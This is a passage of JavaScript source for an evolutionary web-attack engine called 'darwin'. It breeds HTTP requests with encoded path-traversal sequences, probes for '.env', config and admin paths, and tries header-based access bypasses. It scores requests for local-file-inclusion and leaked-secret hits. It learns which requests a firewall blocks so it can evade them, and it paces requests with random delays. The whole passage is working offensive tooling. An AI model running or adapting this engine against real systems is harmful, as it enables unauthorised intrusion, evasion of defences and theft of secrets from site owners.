      var top = isl.population.slice().sort(function (a, b) { return b.fitness[0] - a.fitness[0]; }).slice(0, n);
      migrants.push({ from: isl.id, genomes: top });
    });
    // Ring topology: island i sends to island (i+1) % N
    for (var i = 0; i < islands.length; i++) {
      var receiver = islands[(i + 1) % islands.length];
      var incoming = migrants[i].genomes;
      // Replace worst of receiver
      receiver.population.sort(function (a, b) { return a.fitness[0] - b.fitness[0]; });
      incoming.forEach(function (g) {
        var clone = newGenome({
          method: g.method,
          segments: g.segments.slice(),
          ext: g.ext,
          traversal: g.traversal,
          terminator: g.terminator,
          encoding: g.encoding,
          caseMode: g.caseMode,
          query: g.query.map(function (q) { return { key: q.key, val: q.val }; }),
          headers: Object.assign({}, g.headers),
          generation: g.generation + 1,
          island: receiver.id,
          lineage: { type: 'migration', from: migrants[i].from, parent: g.id }
        });
        receiver.population[0] = clone;
        receiver.population.shift();
        receiver.population.push(clone);
      });
    }
  }

  // ══════════════════════════════════════════════════════════════
  // MAIN EVOLUTION
  // ══════════════════════════════════════════════════════════════
  var running = false;
  var stats = loadJSON(KEYS.stats, {
    generations: 0,
    evaluations: 0,
    blocks: 0,
    passes: 0,
    discoveries: 0,
    islands: 0,
    migrations: 0
  });

  async function evolve(opts) {
    opts = opts || {};
    if (running) return { ok: false, reason: 'already running' };
    running = true;

    var popPerIsland = Math.min(opts.population || 10, 15);
    var generations = Math.min(opts.generations || 12, 30);
    var migrationInterval = 4;
    var islands = [
      Island('I1', {
        encoding: ['raw', 'url'],
        traversal: ['', '..%2f', '%2e%2e%2f'],
        seedPaths: [['admin'], ['api', 'v1'], ['.env'], ['config']]
      }),
      Island('I2', {
        encoding: ['double-url', 'triple-url', 'unicode', 'hex', 'overlong'],
        traversal: ['..%252f', '%252e%252e%252f', '..%c0%af'],
        seedPaths: [['.env'], ['admin', 'config'], ['backup']]
      }),
      Island('I3', {
        paramKeys: ['file', 'path', 'url', 'cmd', 'id', 'debug'],
        seedPaths: [['download'], ['file'], ['read'], ['api', 'file']]
      }),
      Island('I4', {
        headers: ['X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL', 'X-HTTP-Method-Override'],
        seedPaths: [['admin'], ['internal'], ['api', 'admin']]
      })
    ];

    stats.islands = islands.length;
    eventBus.emit('darwin:phase', { phase: 'baseline' });
    await sampleBaseline(6);

    eventBus.emit('darwin:phase', { phase: 'seed' });
    islands.forEach(function (isl) { seedIsland(isl, popPerIsland); });

    var islandStates = islands.map(function (isl) {
      return { id: isl.id, bestImpact: 0, bestStealth: 0, mutationRate: 0.25, stagnation: 0, hypervolume: 0 };
    });

    var history = [];

    // Evaluate seed populations
    for (var ii = 0; ii < islands.length && running; ii++) {
      var isl = islands[ii];
      for (var jj = 0; jj < isl.population.length && running; jj++) {
        var g = isl.population[jj];
        if (Defender.predict(g) > 0.85 && Math.random() < 0.7) {
          g.fitness = [0, 1, 0, 0];
          g.paretoRank = 999;
          continue;
        }
        var r = await evaluate(g);
        g.fitness = r.fitness;
        g.reasons = r.reasons;
        g._response = r.response;
        stats.evaluations++;
        if (r.blocked) { Defender.learnBlock(g); stats.blocks++; }
        else { Defender.learnPass(g); stats.passes++; }
        if (r.reasons.indexOf('lfi') !== -1 || r.reasons.indexOf('secret') !== -1 || r.fitness[0] > 8) stats.discoveries++;
        await new Promise(function (res) { setTimeout(res, 250 + Math.random() * 250); });
      }
      eventBus.emit('darwin:progress', { phase: 'seed', island: isl.id, done: isl.population.length });
    }

    // Main generational loop
    for (var gen = 1; gen <= generations && running; gen++) {
      eventBus.emit('darwin:generation', { gen: gen, islands: islandStates });

      // Evolve each island independently
      for (var is = 0; is < islands.length && running; is++) {
        var island = islands[is];

        // Speciate + fitness share
        var species = speciate(island.population);
        fitnessSharing(species);

        // NSGA-II selection for reproduction
        var combined = nsga2Select(island.population, popPerIsland);

        // Adaptive mutation rate based on stagnation
        var bestNow = Math.max.apply(null, combined.map(function (g) { return g.fitness[0]; }));
        var prevBest = islandStates[is].bestImpact;
        if (bestNow <= prevBest + 0.3) {
          islandStates[is].stagnation++;
          islandStates[is].mutationRate = Math.min(0.6, islandStates[is].mutationRate * 1.3);
        } else {
          islandStates[is].stagnation = 0;
          islandStates[is].mutationRate = Math.max(0.15, islandStates[is].mutationRate * 0.9);
        }

        var nextGen = [];
        var elite = combined.slice().sort(function (a, b) { return b.fitness[0] - a.fitness[0]; }).slice(0, 2);
        elite.forEach(function (g) { nextGen.push(g); });

        while (nextGen.length < popPerIsland) {
          var a = tournament(combined);
          var b = tournament(combined);
          var child;
          if (Math.random() < 0.7) child = crossover(a, b);
          else child = mutate(a, islandStates[is].mutationRate);
          if (Math.random() < 0.6) child = mutate(child, islandStates[is].mutationRate);
          child.island = island.id;

          // Evaluate
          if (Defender.predict(child) > 0.9 && Math.random() < 0.8) {
            child.fitness = [0, 1, 0, 0];
            child.paretoRank = 999;
            nextGen.push(child);
            continue;
          }
          var cr = await evaluate(child);
          child.fitness = cr.fitness;
          child.reasons = cr.reasons;
          child._response = cr.response;
          stats.evaluations++;
          if (cr.blocked) { Defender.learnBlock(child); stats.blocks++; }
          else { Defender.learnPass(child); stats.passes++; }
          if (cr.reasons.indexOf('lfi') !== -1 || cr.reasons.indexOf('secret') !== -1 || cr.fitness[0] > 8) stats.discoveries++;

          // Meta-learning: record which mutations helped
          var parentScore = (a.fitness[0] + b.fitness[0]) / 2;
          var improved = child.fitness[0] > parentScore;
          (child.tags || []).forEach(function (op) { Meta.record(op, improved); });

          // Lamarckian extraction
          if (child.fitness[0] > 3) {
            GenePool.extract(child, child.fitness);
          }

          nextGen.push(child);
          await new Promise(function (res) { setTimeout(res, 220 + Math.random() * 250); });
        }

        island.population = nextGen;

        // Update island state
        var topG = island.population.slice().sort(function (a, b) { return b.fitness[0] - a.fitness[0]; })[0];
        islandStates[is].bestImpact = topG.fitness[0];
        islandStates[is].bestStealth = topG.fitness[1];
        islandStates[is].hypervolume = hypervolume(island.population, [15, 1]);

        recordHall(topG);
        if (topG._response) Novelty.add(topG._response.bodyFull);

        eventBus.emit('darwin:island', {
          island: island.id,
          gen: gen,
          best: topG.fitness,
          path: buildPath(topG.g),
          reasons: topG.reasons,
          species: species.length,
          mutRate: islandStates[is].mutationRate
        });
      }

      // Migration every N generations
      if (gen % migrationInterval === 0) {
        migrate(islands, 1);
        stats.migrations++;
        eventBus.emit('darwin:migration', { gen: gen });
      }

      // Prune gene pool occasionally
      if (gen % 5 === 0) GenePool.prune();
      Meta.persist();

      history.push({
        gen: gen,
        islands: islandStates.map(function (s) { return { id: s.id, best: s.bestImpact, hv: s.hypervolume }; })
      });

      eventBus.emit('darwin:progress', {
        phase: 'gen',
        gen: gen,
        islands: islandStates,
        defenderRules: Defender.size(),
        genePool: GenePool.size()
      });
    }

    running = false;
    stats.generations += generations;
    saveJSON(KEYS.stats, stats);

    var summary = {
      generations: generations,
      population: popPerIsland * islands.length,
      evaluations: stats.evaluations,
      defenderRules: Defender.size(),
      genePool: GenePool.size(),
      islands: islandStates,
      history: history
    };

    eventBus.emit('darwin:done', summary);
    return { ok: true, summary: summary };
  }

  function stop() { running = false; }

  function state() {
    return {
      running: running,
      hallOfFame: hallOfFame.length,
      genePool: GenePool.size(),
      defenderRules: Defender.size(),
      noveltyArchive: Novelty.archive.length,
      meta: Meta.state,
      stats: stats
    };
  }

  function getHall() { return hallOfFame.slice(); }
  function getGenePool() { return GenePool.top(50); }
  function getDefender() { return Defender.top(30); }
  function getMeta() { return Meta.state; }
  function reset() {
    hallOfFame = [];
    GenePool.reset();
    Defender.reset();
    Novelty.reset();
    Meta.reset();
    stats = { generations: 0, evaluations: 0, blocks: 0, passes: 0, discoveries: 0, islands: 0, migrations: 0 };
    saveJSON(KEYS.hall, hallOfFame);
    saveJSON(KEYS.stats, stats);
    return { ok: true };
  }

  function exportEcosystem() {
    return JSON.stringify({
      version: '16.0-omega',
      hall: hallOfFame,
      genePool: GenePool.top(100),
      defender: Defender.top(100),
      novelty: Novelty.archive.slice(-100),
      meta: Meta.state,
      stats: stats
    }, null, 2);
  }

  function importEcosystem(json) {
    try {
      var d = JSON.parse(json);
      if (d.hall) { hallOfFame = d.hall; saveJSON(KEYS.hall, hallOfFame); }
      if (d.genePool) {
        GenePool.pool = d.genePool.map(function (p) {
          return {
            id: p.id || rid(), type: p.type, value: p.value,
            success: p.success || 0, usage: p.usage || 0,
            weight: p.weight || 1, addedAt: p.addedAt || Date.now()
          };
        });
        GenePool.persist();
      }
      if (d.defender) {
        Defender.rules = d.defender.map(function (r) {
          return {
            id: r.id || rid(), pattern: r.pattern,
            regex: new RegExp(r.pattern, 'i'),
            w: r.w || 0.5, hits: r.hits || 0, misses: r.misses || 0
          };
        });
        Defender.persist();
      }
      if (d.meta) { Meta.state = d.meta; Meta.persist(); }
      return { ok: true };
    } catch (e) { return { ok: false, error: e.message }; }
  }

  mods.darwin = {
    evolve: evolve,
    stop: stop,
    state: state,
    hall: getHall,
    genePool: getGenePool,
    defender: getDefender,
    meta: getMeta,
    reset: reset,
    export: exportEcosystem,
    import: importEcosystem,
    _newGenome: newGenome,
    _buildUrl: function (g) { return buildUrl(g); },
    _evaluate: evaluate,
    _primitives: P
  };
  core.darwin = mods.darwin;

  eventBus.emit('darwin:ready', {
    hallOfFame: hallOfFame.length,
    genePool: GenePool.size(),
    defenderRules: Defender.size(),
    islandsSupported: 4
  });

  if (typeof completion === 'function') completion(true);
})();